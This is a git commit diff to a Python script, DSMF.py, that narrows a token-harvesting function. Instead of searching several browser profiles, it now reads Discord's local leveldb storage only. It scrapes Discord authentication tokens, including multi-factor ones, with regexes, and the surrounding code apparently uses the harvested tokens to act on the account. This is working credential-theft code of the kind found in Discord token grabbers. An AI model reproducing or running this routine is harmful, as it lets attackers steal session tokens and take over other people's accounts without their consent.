1b0b7c61e69770a8ebfebed71120aad587d68bba
jungjin0003 <jungjin00031@gmail.com>
2021-08-18 23:12:31 +0900

    Update src

--- DSMF.py
+++ DSMF.py
@@ -26,35 +26,24 @@ def token_check(token):
     return change_message(token, None)
 
 def find_token():
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
-
-    paths = {
-        'Discord': roaming + '\\Discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
-    }
+    path = os.getenv('APPDATA') + '\\Discord'
 
     tokens = []
 
-    for platform, path in paths.items():
-        if not os.path.exists(path):
+    if not os.path.exists(path):
+        print('[-] Discord not found!')
+        sys.exit(-1)
+
+    path += '\\Local Storage\\leveldb'
+
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
             continue
 
-        path += '\\Local Storage\\leveldb'
-
-        for file_name in os.listdir(path):
-            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-                continue
-
-            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                    for token in re.findall(regex, line):
-                        tokens.append(token)
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
 
     return tokens
 
